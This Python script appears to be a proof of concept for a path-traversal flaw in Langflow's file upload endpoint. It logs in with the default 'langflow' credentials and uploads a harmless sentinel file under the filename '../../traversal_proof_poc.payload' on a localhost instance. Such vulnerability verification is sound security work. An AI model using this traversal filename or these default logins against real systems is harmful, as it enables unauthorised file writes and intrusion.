import requests

BASE_URL = "http://localhost:9335"

session = requests.Session()

login_resp = session.post(
    f"{BASE_URL}/api/v1/login",
    data={
        "username": "langflow",
        "password": "langflow",
    },
)
print("login status:", login_resp.status_code)
print("login body:", login_resp.text)

login_resp.raise_for_status()
token = login_resp.json()["access_token"]

TRAVERSAL_FILENAME = "../../traversal_proof_poc.payload"
SENTINEL_CONTENT = b"traversal_proof_poc"

resp = session.post(
    f"{BASE_URL}/api/v2/files/",
    headers={"Authorization": f"Bearer {token}"},
    files={"file": (TRAVERSAL_FILENAME, SENTINEL_CONTENT, "text/plain")},
)

print("upload status:", resp.status_code)
print("upload body:", resp.text)